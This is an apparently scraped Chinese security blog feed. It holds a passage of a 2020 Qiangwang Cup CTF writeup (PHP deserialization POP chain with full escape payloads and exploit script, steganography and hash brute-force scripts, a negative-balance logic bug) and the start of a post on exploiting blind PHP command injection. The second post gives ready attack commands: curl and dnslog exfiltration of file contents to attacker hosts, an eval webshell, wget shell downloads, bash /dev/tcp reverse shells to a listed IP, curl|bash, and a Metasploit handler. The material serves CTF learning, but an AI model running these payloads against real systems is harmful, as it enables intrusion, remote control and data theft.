?hash1=0e251288019&amp;hash2[]=2&amp;hash3[]=3&amp;hash4=ffifdyop 0x03 强网先锋：web辅助考点：pop链+反序列化逃逸+代码审计题目给了源码，审计代码： //index.php &lt;?php @error_reporting(0); require_once &quot;common.php&quot;; require_once &quot;class.php&quot;; if (isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;])){ $username = $_GET[&#39;username&#39;]; $password = $_GET[&#39;password&#39;]; $player = new player($username, $password); //实例化class.php的player类得到对象 file_put_contents(&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]), write(serialize($player))); //将$player序列化 //write增两个字符 //file_put_contents()函数把序列化结果写入文件中 echo sprintf(&#39;Welcome %s, your ip is %s\\n&#39;, $username, $_SERVER[&#39;REMOTE_ADDR&#39;]); } else{ echo &quot;Please input the username or password!\\n&quot;; } ?&gt; //class.php &lt;?php class player{ protected $user; protected $pass; protected $admin; public function __construct($user, $pass, $admin = 0){ //构造函数 $this-&gt;user = $user; $this-&gt;pass = $pass; $this-&gt;admin = $admin; } public function get_admin(){ return $this-&gt;admin; //定义get_admin()函数，返回$admin变量 } } class topsolo{ protected $name; public function __construct($name = &#39;Riven&#39;){ $this-&gt;name = $name; } public function TP(){ if (gettype($this-&gt;name) === &quot;function&quot; or gettype($this-&gt;name) === &quot;object&quot;){ //gettype获取变量的类型 $name = $this-&gt;name; $name(); //1、将实例化对象name当作方法使用，触发midsolo类里的__invoke() } } public function __destruct(){//析构函数，反序列化时调用TP()函数 $this-&gt;TP(); } } class midsolo{ protected $name; public function __construct($name){ $this-&gt;name = $name; } public function __wakeup(){//属性个数的值大于真实属性个数跳过__wakeup()函数 if ($this-&gt;name !== &#39;Yasuo&#39;){ $this-&gt;name = &#39;Yasuo&#39;; echo &quot;No Yasuo! No Soul!\\n&quot;; } } public function __invoke(){ $this-&gt;Gank();//调用Gank()函数 } public function Gank(){ if (stristr($this-&gt;name, &#39;Yasuo&#39;)){//2、进行字符串比较触发jungle类里的__toString() echo &quot;Are you orphan?\\n&quot;; } else{ echo &quot;Must Be Yasuo!\\n&quot;; } } } class jungle{ protected $name = &quot;&quot;; public function __construct($name = &quot;Lee Sin&quot;){ $this-&gt;name = $name; } public function KS(){ system(&quot;cat /flag&quot;); } public function __toString(){ $this-&gt;KS(); //调用KS()函数，得到flag return &quot;&quot;; } } ?&gt; //common.php &lt;?php function read($data){ $data = str_replace(&#39;\\0*\\0&#39;, chr(0).&quot;*&quot;.chr(0), $data); //\\0*\\0替换成0*0吃掉两个字符 return $data; } function write($data){ $data = str_replace(chr(0).&quot;*&quot;.chr(0), &#39;\\0*\\0&#39;, $data); //0*0替换成\\0*\\0 增加两个字符 return $data; } function check($data) { if(stristr($data, &#39;name&#39;)!==False){ //$data不能包含name die(&quot;Name Pass\\n&quot;); } else{ return $data; } } ?&gt; //play.php &lt;?php @error_reporting(0); require_once &quot;common.php&quot;; require_once &quot;class.php&quot;; @$player = unserialize(read(check(file_get_contents(&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]))))); //file_get_contents将文件读入字符串 //调用check检查name，调用read吃两个字符 print_r($player); if ($player-&gt;get_admin() === 1){ //调用player类的get_admin()函数，获得$admin echo &quot;FPX Champion\\n&quot;; } else{ echo &quot;The Shy unstoppable\\n&quot;; } ?&gt; 写一下每个文件里的大致意思： index.php 1、在 index.php get传入username和password参数，分别赋值给$username和$password变量 然后将变量传入class.php的player类 2、对$player进行序列化；增两个字符；写入caches目录下的(ip进行md5加密)的文件名 class.php 3、player类： 声明三个保护字段$user、$pass和$admin。 构造函数： $user=$username；$pass=$password；$admin=0 get_admin()函数：返回$admin变量到调用位置(即，play.php中判断返回$admin是否为1) 4、topsolo类： 声明保护字段$name 构造函数：$name=&#39;Riven&#39; 析构函数：调用TP()函数；反序列化时调用 TP()函数：判断$name变量类型，若为函数或对象触发__invoke()魔术方法 5、midsolo类： __wakeup()魔术方法：属性个数的值大于真实属性个数跳过 __invoke()魔术方法：调用Gank()函数 Gank()函数：进行字符串比较触发__toString()魔术方法 6、jungle类： __toString()魔术方法：调用KS()函数 KS()函数：执行系统命令得到flag play.php 7、读取caches目录下文件名是md5加密ip得到的文件；检查不能包含name字符串；\\0*\\0替换成0*0吃掉两个字符；反序列化 8、调用player类的get_admin()函数，获得$admin需等于1 common.php 9、定义read()函数、write()函数和check()函数 read()函数：\\0*\\0替换成0*0吃掉两个字符 write()函数：0*0替换成\\0*\\0 增加两个字符 check()函数：$data不能包含name字符串 执行顺序可能是：1-&gt;2-&gt;(9)-&gt;7-&gt;(9)-&gt;3-&gt; 4-&gt;5-&gt;6 8-&gt;3 审计完代码后，发现class.php里的topsolo类、midsolo类和jungle类可以构造出打印flag的pop链： topsolo类里析构函数调用TP()函数，TP()函数判断$name变量类型，若为函数或对象触发midsolo类里的__invoke()魔术方法；__invoke()魔术方法调用Gank()函数，Gank()函数进行字符串比较触发jungle类里的__toString()魔术方法；__toString()魔术方法调用KS()函数，KS()函数执行得到flag的系统命令。 构造POP链进行序列化： &lt;?php class topsolo{ protected $name=&quot;Riven&quot;; public function __construct(){ $this-&gt;name = new midsolo(); } } class midsolo{ protected $name; public function __construct(){ $this-&gt;name = new jungle(); } } class jungle{ protected $name = &quot;Lee Sin&quot;; public function __toString(){ system(&quot;cat /flag&quot;); return &quot;&quot;; } } $hack=new topsolo(); print_r(serialize($hack)); ?&gt; 序列化结果为： //protected变量序列化后需要在变量前的星号*左右手动添加不可见字符%00，使其成为%00*%00 O:7:&quot;topsolo&quot;:1:{s:7:&quot;%00*%00name&quot;;O:7:&quot;midsolo&quot;:1:{s:7:&quot;%00*%00name&quot;;O:6:&quot;jungle&quot;:1:{s:7:&quot;%00*%00name&quot;;s:7:&quot;Lee Sin&quot;;}}} 同样对player类进行序列化，得到序列化后的结果： O:6:&quot;player&quot;:3:{s:7:&quot;%00*%00user&quot;;N;s:7:&quot;%00*%00pass&quot;;N;s:8:&quot;%00*%00admin&quot;;i:1;} 源码中只对player类进行反序列化，read()函数将\\0*\\0替换成0*0吃掉两个字符，于是考虑使用字符串逃逸，破坏序列化字符串的结构，吃掉一部分。pop链序列化字符串长度为109方法一：吃掉的字符串为&quot;;s:7:&quot;%00*%00pass&quot;;s:109:&quot;，长度为23。进行一次read()函数可以吃掉两个字符，需进行11.5次，很明显不可以。在吃掉的字符串后补一位，即吃掉的字符串为&quot;;s:7:&quot;%00*%00pass&quot;;s:109:&quot;1，长度为24。read()函数进行12次，也就是需要12个%00*%00。方法二：吃掉的字符串为&quot;;s:7:&quot;%00*%00pass&quot;;s:109:，长度为22。read()函数进行11次，也就是需要11个%00*%00。还需要注意的是要跳过midsolo类里的__wakeup()魔术方法，将原本属性个数的值1改大一些，如：2源码中check函数过滤了关键字name，将序列化字符串中表示变量(名)为字符串的小写s换为大写S，即可解析变量(名)中的16进制\\6e\\61\\6d\\65(即name)。因为read()函数是将\\0*\\0替换成0*0吃掉两个字符，所以需要将username里的%00换成\\0，password里为了防止被吃，不要换或将%00换成\\00。方法一构造payload：需要read()函数进行12次，也就是需要12个%00*%00 username=qwzf\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0 password=1&quot;;s:7:&quot;%00*%00pass&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;%00*%00\\6e\\61\\6d\\65&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;%00*%00\\6e\\61\\6d\\65&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;%00*%00\\6e\\61\\6d\\65&quot;;s:7:&quot;Lee Sin&quot;;}}};s:8:&quot;\\00*\\00admin&quot;;i:1;} 将%00换成\\00的(注意将1&quot;;s:7换成1&quot;;S:7 暂时不晓得为什么): 1&quot;;S:7:&quot;\\00*\\00pass&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;\\00*\\00\\6e\\61\\6d\\65&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\\00*\\00\\6e\\61\\6d\\65&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\\00*\\00\\6e\\61\\6d\\65&quot;;s:7:&quot;Lee Sin&quot;;}}};s:8:&quot;\\00*\\00admin&quot;;i:1;} 这样就成功将pop链序列化的结果填入了password中，使其被反序列化，打印flag。也可以进行url编码(也可以不用编码)一下，得到最终payload： username=qwzf%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0 password=1%22;s:7:%22%00*%00pass%22;O:7:%22topsolo%22:1:{S:7:%22%00*%00%5C6e%5C61%5C6d%5C65%22;O:7:%22midsolo%22:2:{S:7:%22%00*%00%5C6e%5C61%5C6d%5C65%22;O:6:%22jungle%22:1:{S:7:%22%00*%00%5C6e%5C61%5C6d%5C65%22;s:7:%22Lee Sin%22;}}};s:8:%22%5C00*%5C00admin%22;i:1;} 方法二构造payload：原理类似，吃的字符数不同。需要read()函数进行11次，也就是需要11个%00*%00 username=qwzf\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0 password=;s:7:&quot;%00*%00pass&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;%00*%00\\6e\\61\\6d\\65&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;%00*%00\\6e\\61\\6d\\65&quot;;O:6:&quot;jungle&quot;:1:{s:7:&quot;%00*%00\\6e\\61\\6d\\65&quot;;s:7:&quot;Lee Sin&quot;;}}};S:8:&quot;%00*%00admin&quot;;i:0;} 传入后访问play.php，进行反序列化，得到flag。为了方便直接写了个expexp： import requests url=&quot;http://eci-2ze4mvter6u4z188kpmz.cloudeci1.ichunqiu.com/&quot; users=&quot;?username=qwzf%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0&quot; pwds=&#39;&amp;password=1%22;S:7:%22%5C00*%5C00pass%22;O:7:%22topsolo%22:1:{S:7:%22%5C00*%5C00%5C6e%5C61%5C6d%5C65%22;O:7:%22midsolo%22:2:{S:7:%22%5C00*%5C00%5C6e%5C61%5C6d%5C65%22;O:6:%22jungle%22:1:{s:7:%22%5C00*%5C00%5C6e%5C61%5C6d%5C65%22;s:7:%22Lee Sin%22;}}};S:8:%22%5C00*%5C00admin%22;i:1;}&#39; #传入payload urls=url+ users + pwds r=requests.get(urls) print(r.text) #访问play.php吃掉字符，输出进行反序列化后的结果 res=requests.get(url+&quot;play.php&quot;) print(res.text) 运行得到flag 0x04 强网先锋：upload考点：流量分析+steghide隐写下载解压题目，是一个流量包，筛选协议为http的流量包。发现意思应该就是使用了steghide隐写，并且是含有密码的。查看下一个数据包，发现里面隐藏了一张jpg图片，提取出来因为没找到密码，所以直接使用steghide隐写工具不能提取出隐藏内容。考虑使用脚本爆破密码： #python3运行 from subprocess import * def foo(): stegoFile=&#39;1.jpg&#39;#隐写的图片 extractFile=&#39;passwd.txt&#39;#爆破的密码 passFile=&#39;dic.txt&#39;#字典 errors=[&#39;could not extract&#39;,&#39;steghide --help&#39;,&#39;Syntax error&#39;] cmdFormat=&#39;steghide extract -sf &quot;%s&quot; -xf &quot;%s&quot; -p &quot;%s&quot;&#39; f=open(passFile,&#39;r&#39;) for line in f.readlines(): cmd=cmdFormat %(stegoFile,extractFile,line.strip()) p=Popen(cmd,shell=True,stdout=PIPE,stderr=STDOUT) content=str(p.stdout.read(),&#39;gbk&#39;) for err in errors: if err in content: break else: print (content), print (&#39;the passphrase is %s&#39; %(line.strip())) f.close() return if __name__ == &#39;__main__&#39;: foo() print (&#39;ok&#39;) pass 爆破得到密码123456，然后使用steghide工具提取含有密码的隐藏内容 steghide extract -sf 1.jpg -p 123456 得到flag 0x05 强网先锋：bank考点：爆破hash+逻辑漏洞nc连过去发现是只有得到XXX，才能进行下一步。找脚本爆破前三位即可，注意速度要快，因为这个nc连接每隔一会儿就会断 #python2运行 #-*- coding:utf-8 -*- import string import hashlib import time import threading import sys string = input(&quot;your str：&quot;) sha256 = input(&quot;your sha256：&quot;) strr=&quot;ABCDEFGHIJKMLNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot; def main1(asc1): def main2(asc2): def main3(asc3): asc = asc1+asc2+asc3 proof=asc+string digest = hashlib.sha256(proof.encode(&#39;utf-8&#39;)).hexdigest() if digest == sha256: zhi =&#39;\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n-------------------------------------\\n&#39;+proof+&#39;\\n&#39;+digest+&#39;\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n&#39; f = open(&quot;zhi.txt&quot;,&#39;w&#39;) f.write(zhi) f.close() print(&#39;\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n-------------------------------------&#39;) print(proof+&#39;\\n&#39;+digest+&#39;\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n&#39;) sys.exit(0) return #else: #day = time.asctime(time.localtime(time.time())) #print &quot;当前时间为：&quot; + day+&#39;\\n&#39; #print proof+&quot;\\n&quot;+digest+&quot;\\n&quot; for asc3 in strr: t3 = threading.Thread(target=main3,args=(asc3,)) t3.start() for asc2 in strr: t2 = threading.Thread(target=main2,args=(asc2,)) t2.start() for asc1 in strr: t1 = threading.Thread(target=main1,args=(asc1,)) t1.start() 输入爆破出的XXX的值；然后输入队伍token。hint提示的是AES ECB模式加密(可能这才是预期解)。发现需要买flag，需要1000现金，而自己有10现金。涉及现金，队友想到可能有逻辑漏洞，随便输入负数，发现自己的现金增加了。输入qwzf -995，和之前的10相加，够1000现金了，get flag，支付现金得到flag。 0x06 Web：half_infiltration考点：反序列化+内网攻击题目源码(自己添加注释后的)： &lt;?php highlight_file(__FILE__); $flag=file_get_contents(&#39;ssrf.php&#39;); class Pass { function read() { ob_start(); //打开输出控制缓冲 global $result; //函数内部的global,在函数内部的为局部变量，与外部互不干涉 print $result; } } class User { public $age,$sex,$num; function __destruct()//析构函数，反序列化时调用 { $student = $this-&gt;age; //将$age赋值给$student $boy = $this-&gt;sex; //将$sex赋值给$boy $a = $this-&gt;num; //将$num赋值给$a $student-&gt;$boy(); //$student以对象调用的方式调用$boy方法 if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); //清空缓冲区并关闭输出缓冲 exit(); } global $$a; //函数内部的global，声明可变变量 $result=$GLOBALS[&#39;flag&#39;]; //当前页面的全局变量$key = value的引用，即引用$flag的值 ob_end_clean(); } } if (isset($_GET[&#39;x&#39;])) { echo &quot;&lt;br /&gt;&quot;.$_GET[&#39;x&#39;].&quot;&lt;br /&gt;&quot;; $q=unserialize($_GET[&#39;x&#39;])-&gt;get_it(); print_r($q); } ?&gt; 构造poc &lt;?php $qwzf = new User; $qwzf-&gt;age = new Pass; $qwzf-&gt;sex = &#39;read&#39;; $qwzf-&gt;num = &#39;result&#39;; $c = new User; $c-&gt;age = new Pass; $c-&gt;sex = &#39;read&#39;; $c-&gt;num = this; $test = serialize([$qwzf,$c]); var_dump($test); 由于是第五空间do you know原题改的，所以直接修改payload得到： a:3:{i:0;O:4:&quot;User&quot;:3:{s:3:&quot;age&quot;;O:4:&quot;Pass&quot;:0:{}s:3:&quot;boy&quot;;s:4:&quot;read&quot;;s:3:&quot;num&quot;;s:6:&quot;result&quot;;}i:0;O:4:&quot;User&quot;:3:{s:3:&quot;age&quot;;O:4:&quot;Pass&quot;:0:{}s:3:&quot;boy&quot;;s:4:&quot;read&quot;;s:3:&quot;num&quot;;s:4:&quot;this&quot;;}i:0;s:4:&quot;AAAA&quot;;} 将payload传入，查看源代码，发现进了内网，内网服务没做出来。找到大师傅的博客如下：2020第四届“强网杯”全国网络安全挑战赛初赛Writeup 0x07 MISC：miscstudy考点：流量分析+TLS解密+Base64+二进制作像素点画图+jphide隐写+文件分离+crc32碰撞+明文攻击+Python3盲水印+snow在html嵌入隐写信息第一关筛选http数据包，得到39.99.247.28/fonts/1访问得到flag{level1_begin_and_level2_is_come第二关第一关的内容，查询发现是TLS密文日志，保存到一个文件里。使用TLS密文日志在Wirshark解密流量：打开Wireshark-&gt;编辑-&gt;首先项-&gt;Protocols-&gt;TLS-&gt;选择TLS密文日志文件筛选http数据包，得到47.244.9.130/images/4e5d47b2db53654959295bba216858932.png访问得到一张图片，右键保存到本地。winhex打开发现后半部分有可疑信息IDAT，并且最后面的IDAT和IEND之间的信息应该是Base64编码：bGV2ZWwzX3N0YXJ0X2l0Base64解码得到：level3_start_it第三关第二关发现的可疑IDAT，在上边还有3段，分别进行base64解码得到3600二进制数。想到利用脚本转化为图片。并且应该是像素点画图，1RGB值为(0,0,0)，0RGB值为(255,255,255)。拿个大师傅的脚本： from PIL import Image MAX = 60 pic = Image.new(&quot;RGB&quot;,(MAX, MAX)) data = &quot;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001111111111110000000100110000100000000011100001111111111100001111111111110000000110111000100000000011100001111111111100001100000000110010011111110010000000001100111001000000000100001100000000110010000110110010000000000001111001000000000100001100111100110010000100110010011100000011101001001111100100001100111100110000100000001110011111110010000001001111100100001100111100110000000000001110011110110010000001001111100100001100111100110011100100111111111100110011100000001111100100001100000000110011000000000111100110110110000001000000000100001100000000110010011000000011100011111110011001000000000100001111111111110010011001001001100110110010011001111111111100001111111111110010011001001100000100110010011001111111111100000000000000000010011111110010011000111000100000000000000000000000000000000010001111100010011000011101100000000000000000001110011000111100000001000000011000001111111001111000111000000110000000000000000001000000011000000000011001000000000000000010000001000011100001000000111100110000011000000010000000001110011001111110000000000000010001001110011111000010011000001110011001111110000000000000011001001110011111000010011000001100111000000011111000000010000100000100100111000000100100000001100000000111011000000111000100001100000111000000000000000011100000111110011000001111111100001100011111110010000000000000111001001100000000001100000111001110011111001000100100000000111001001000000000001000000111001110011111001100100100000011100000110011111111000000011100001111111000001110011100000011000000010011111110000000011100001111111000000110001100000000000100000010000000000000011000001110011001000000100100000000000000000110000000000000000000001110011011100000000000000010001001111110000100000000100000011111111101111100000000000011000000001110000000111111100110000001100000000010000000000011100000001110000000111111100111000000100000000010000000001110000100111111111111000000011100111000011000001100000000001111000110001001100111000000011000011100011000000000000000001111100111001100100101111111111001111100001001110011111100001100000111110000100000000010000000111100011000000011100100001000000111110000100000000010000000111000011000000011100100000011011100000011100000000000000001110000011111000001100100000111111100000011000000000000000011100000001101000000100100001111100000110010000100000000011111000010000000001100010000000111100000000010000110000000000000000110000000001100000000000011100100000010011111000011100000001110000000111000100000001100111000111110011111001111111100001010011111111100011000001000111000111110011111001111111100001110011011111100011000000000000000000010011001001110000001110001111000001100000100000000000000000010011000001100000000110000011000001100000100001111111111110010011000111000110000111100011001001100111100001100000000110000111100000011111111001110001000001100111000001100000000110000111100000011111111001110011000001100111000001100111100110000100001000000100001001110011111111100000000001100111100110000100001000001100001001100001111111000000000001100111100110010011000111111111000111110000111000011011100001100111100110000011000110000000000000110000000000011011100001100111100110000011111110000000100001110011000000000011100001100000000110011100100111000011001111100011111111111100000001100000000110011100100111000011001111100011111111111100000001011111111010010011111110011111001001110011111100000011000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot; i=0 # print(len(data)) for y in range (0,MAX): for x in range (0,MAX): if(data[i] == &#39;1&#39;): pic.putpixel([x,y],(0, 0, 0)) else: pic.putpixel([x,y],(255,255,255)) i = i+1 pic.show() pic.save(&quot;flag.png&quot;) 运行脚本，得到一个二维码图片，扫描得 链接：http://pan.baidu.com/s/1wVJ7d0RLW8Rj-HOTL9Shug 提取码：1lms 下载发现是一个jpg图片，经过stegdetect分析，是jphide隐写 stegdetect -tjopi -s 10.0 level4.jpg 使用stegbreak爆破密码。(stegbreak是stegdetect工具里的一个程序) stegbreak -r rules.ini -f password.txt -t p [stego_file] # password.txt为字典文件 得到密码为power123。然后使用jphs的seek选项，输入两次密码power123提取隐藏信息 http://pan.baidu.com/s/1o43y4UGkm1eP-RViC25aOw mrpt level4_here_all 第四关访问第三关的百度网盘链接，下载文件。解压发现level5、level6和level7都在压缩包里，并且还有张1.png图片。但level5.png解压失败，使用foremost工具分离出来了level5.png，打开即是本关的flag：level5_is_aaa第五关打开level6.zip，发现有密码并且文件大小都很小，想到crc32碰撞。但通用脚本并没有碰撞出来内容。从wp了解到通用脚本只能碰撞4字节和6字节的。而这个是4字节和5字节的。于是直接拿来师傅的脚本碰撞： #coding:utf-8 #通用脚本：http://github.com/theonlypwner/crc32 目前适合4、6字节的 import binascii import string # dic=string.printable #各种打印字符 dic=&#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39; crc1 = 0x9aeacc13 # 记得要以0x开头 crc2 = 0xeed7e184 crc3 = 0x289585af def CrackCrc5(crc): for i in dic : for j in dic: for p in dic: for q in dic: for h in dic: s=i+j+p+q+h if crc == (binascii.crc32(s.encode(&quot;ascii&quot;))): print (s) return 1 def CrackCrc4(crc): for i in dic : for j in dic: for p in dic: for q in dic: s=i+j+p+q if crc == (binascii.crc32(s.encode(&quot;ascii&quot;))): print (s) return 1 CrackCrc5(crc1) CrackCrc4(crc2) CrackCrc5(crc3) 运行脚本，得到的内容为level6_isready第六关打开level7.zip，发现依旧加密了。但加密的文件有1.png。而之前第四关解压出来的有一张未加密的1.png。于是想到明文攻击：将1.png压缩成1.zip使用ARCHPR工具，选择攻击类型为明文。选择加密文件level.zip，明文文件1.zip。开始攻击得到解密后的压缩包level7_decrypted.zip，解压发现两张一样的图一般遇到两张一样的图，可以想到：双图、盲水印。测试后发现要使用python3版本的 python3 bwmforpy3.py decode 4.png 5.png result.png level7ishere 39.99.247.28/final_level 第七关访问第六关得到的地址39.99.247.28/final_level，额，没找到关键信息。瞟一眼wp，发现snow，第一印象想成了whitespace隐写，然而并不是。看一下大师傅这部分的完整wp： 这里是静态页面且目录下无法扫到其它的东西。那么应该是一种隐写。最后发现存在 snow 在html嵌入隐写信息，我们可以直接去解密网站在线解密 http://fog.misty.com/perry/ccs/snow/snow/snow.html 但是这里我们还需要知道其密码。经过反复尝试和查找，发现其密码居然是 no one can find me 额，这就很明确了。考察的是在html嵌入隐写信息，直接使用解密网站解密，密码是在源代码处发现的no one can find me，解密得到the_misc_examaaaaaaa_!!!} 七关拼在一起就是最终flag! 0x08 后记总的来说，这次强网杯比赛收获很大。学到的新知识有：md4、反序列化逃逸、steghide隐写爆破密码、hash碰撞、TLS解密、二进制作像素点画图、jphide隐写、4字节和5字节的crc32碰撞、snow在html嵌入隐写信息参考：2020第四届“强网杯”全国网络安全挑战赛初赛Writeup","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"强网杯","slug":"强网杯","permalink":"https://qwzf.github.io/tags/强网杯/"},{"name":"Web","slug":"Web","permalink":"https://qwzf.github.io/tags/Web/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.github.io/tags/MISC/"}],"author":"qwzf"},{"title":"浅谈PHP无回显命令执行的利用","slug":"浅谈PHP无回显命令执行的利用","date":"2020-08-18T13:30:10.000Z","updated":"2020-10-20T12:24:40.908Z","comments":true,"path":"2020/08/18/浅谈PHP无回显命令执行的利用/","link":"","permalink":"https://qwzf.github.io/2020/08/18/浅谈PHP无回显命令执行的利用/","excerpt":"","text":"本文首发于先知社区 前言在CTF题或在一些渗透测试中往往会遇到没有回显的命令执行漏洞，为了能更好的实现对无回显命令执行漏洞的利用，我对此进行了简单总结。 判断方法命令执行可能会存在命令执行但没有回显，所以首先要判断命令是否有执行。确定命令可以执行，然后就可以进行无回显命令执行的利用了。 1、审计代码审计代码，根据代码逻辑判断(这个就需要扎实的审计代码能力的功底了) 2、利用延时ip=|sleep 5 如果执行后延时5秒，就证明测试点存在命令执行漏洞 3、HTTP请求 注意：ping命令不会产生http请求 1.在公网服务器监听监听端口 nc -lp 4444 2.向目标服务器发起http请求，执行curl命令 ip=|curl ip:4444 如果向目标服务器发起http请求后，公网服务器监听端口得到一些信息，就证明测试点存在命令执行漏洞。 4、DNS请求 如果请求的目标不是ip地址而是域名，那么域名最终还要转化成ip地址，就肯定要做一次域名解析请求。那么假设我有个可控的二级域名，那么它发出三级域名解析的时候，我这边是能够拿到它的域名解析请求的，这就相当于可以配合DNS请求进行命令执行的判断，这一般就被称为dnslog。（要通过dns请求即可通过ping命令，也能通过curl命令，只要对域名进行访问，让域名服务器进行域名解析就可实现） 来源：安全脉搏 （1）首先去ceye.io注册个账号，注册完后会给一个域名我注册后给的域名是v4utm7.ceye.io（2）如果有域名解析请求就会被记录。访问qwzf.v4utm7.ceye.io，那么就会记录下来这个域名解析请求。简单测试一下向目标服务器发起http请求，执行下面的命令 ip=|curl `whoami`.v4utm7.ceye.io 查看dnslog若果得到执行结果(如上面执行whoami命令，得到www-data)，就说明测试点存在命令执行。 利用方法了解了无回显命令执行的判断方法后，当然是还需要了解学习一下无回显命令执行的利用方法。但测试利用方法之前，首先要准备一下环境。于是我写出下面的测试代码进行利用测试：index.php &lt;?php header(&quot;Content-type: text/html; charset=utf-8&quot;); highlight_file(__FILE__); include(&quot;flag.php&quot;); $ip=$_REQUEST[&#39;ip&#39;]; if($ip){ shell_exec(&quot;ping -c 4 &quot;.$ip); } ?&gt; 1、执行命令 利用条件：需要站点目录具有写权限 通过执行命令，直接将php文件写入到在浏览器可直接读取的文件类型中(如txt文件)，然后访问txt文件即可得到php文件内容1.使用&gt;或&gt;&gt; cat flag.php &gt; flag.txt cat flag.php &gt;&gt; flag.txt 2.使用cp命令 cp flag.php flag.txt 3.使用mv命令 mv flag.php flag.txt 通过执行tar命令和zip命令打包或压缩php文件，在浏览器上下载打包或压缩文件解压得到php文件内容（1）tar打包或tar打包并压缩 tar cvf flag.tar flag.php tar zcvf flag.tar.gz flag.php #解打包并解压缩：tar zxvf flag.tar.gz 解打包得到flag：（2）zip压缩 zip flag.zip flag.php #解压缩：unzip flag.zip 等等。 2、写webshell(直接写入或外部下载webshell) 利用条件：需要站点目录具有写权限 1.写webshell echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php echo &quot;&lt;?php @eval(\\$_POST[123]); ?&gt;&quot; &gt; webshell.php 2.外部下载shell 利用条件：目标服务器可以连接外网或可以与攻击机互通，且能执行wget命令 wget 网址 -O webshell.php #使用wget下载shell，使用参数-O来指定一个文件名 利用命令执行写webshell或外部下载webshell后，用蚁剑连接测试，发现成功然后在蚁剑里直接查看flag.php文件，即可得到flag。 3、在vps上建立记录脚本 利用条件：需要目标服务器可以向公网服务器发起http请求，并且能执行curl命令或wget命令 1.构造记录脚本在自己的公网服务器站点根目录写入php文件，内容如下：record.php &lt;?php $data =$_GET[&#39;data&#39;]; $f = fopen(&quot;flag.txt&quot;, &quot;w&quot;); fwrite($f,$data); fclose($f); ?&gt; 2.构造请求在目标服务器的测试点可以发送下面其中任意一条请求进行测试 curl http://*.*.*.**/record.php?data=`cat flag.php` wget http://*.*.*.*/record.php?data=`cat flag.php` 3.测试 执行命令后发现在公网服务器得到的flag.txt文件中，只得到下面内容，并未得到flag于是考虑对命令执行的结果进行编码后写入flag.txt文件 curl http://*.*.*.**/record.php?data=`cat flag.php|base64` wget http://*.*.*.*/record.php?data=`cat flag.php|base64` 最终得到Base64解码即可得到flag。 4、通过dnslog带出数据 （1）命令执行时要避免空格，空格会导致空格后面的命令执行不到；（2）将读取的文件命令用反引号``包含起来；（3）拼接的域名有长度限制。 利用命令： curl `命令`.域名 测试一下命令 #用&lt;替换读取文件中的空格，且对输出结果base64编码 curl `cat&lt;flag.php|base64` #拼接域名(最终构造结果) curl `cat&lt;flag.php|base64`.v4utm7.ceye.io #另一种方法(不过有的环境下不可以)`cat flag.php|sed s/[[:space:]]//g`.v4utm7.ceye.io 利用dnslog，查看文件内容(flag.php文件内容)base64解码得到flag 5、反弹shell 利用条件：目标服务器可以向可通信的公网服务器发起http请求 1.服务器端执行nc -vv -lp 88882.命令执行处执行bash -i &gt;&amp; /dev/tcp/47.95.206.199/8888 0&gt;&amp;13.payloadip=127.0.0.1%0d%0abash+-i+&gt;%26+/dev/tcp/47.95.206.199/8888+0&gt;%261注意：百度搜索到的基本上都是上边这个方法，但经过测试并未成功。于是想到以前见过的一种方法 #1.首先在公网服务器使用nc命令监听端口 nc -lvp 4444 #或nc -vv -lp 4444 #2.然后在公网服务器上写一个文件(我写入到qwzf文件)，内容是下面命令 bash -i &gt;&amp; /dev/tcp/x.x.x.165/4444 0&gt;&amp;1 #3.最终浏览器上执行的payload(实际上就是在目标机执行curl x.x.x.165:8002/qwzf|bash) ip=|curl x.x.x.165:8002/qwzf|bash 6、msf反向回连 利用条件：目标服务器可以向可通信的公网服务器发起http请求 1.远程服务器用msf监听： use exploit/multi/handler set payload linux/armle/shell/reverse_tcp set lport 4444 set lhost xxx.xxx.xxx.xxx set exitonsession false exploit -j 2.目标服务器执行下面命令 ip=|bash -i &gt;&amp; /dev/tcp/xxxxx(vps公网ip)/4444 0&gt;&amp;1 #如果上面这条命令在浏览器上执行失败。那么要将上面这条命令写入公网服务器上的一个文件中，在msf开始监听后，在测试点执行下面命令 ip=|curl x.x.x.165:8002/qwzf|bash 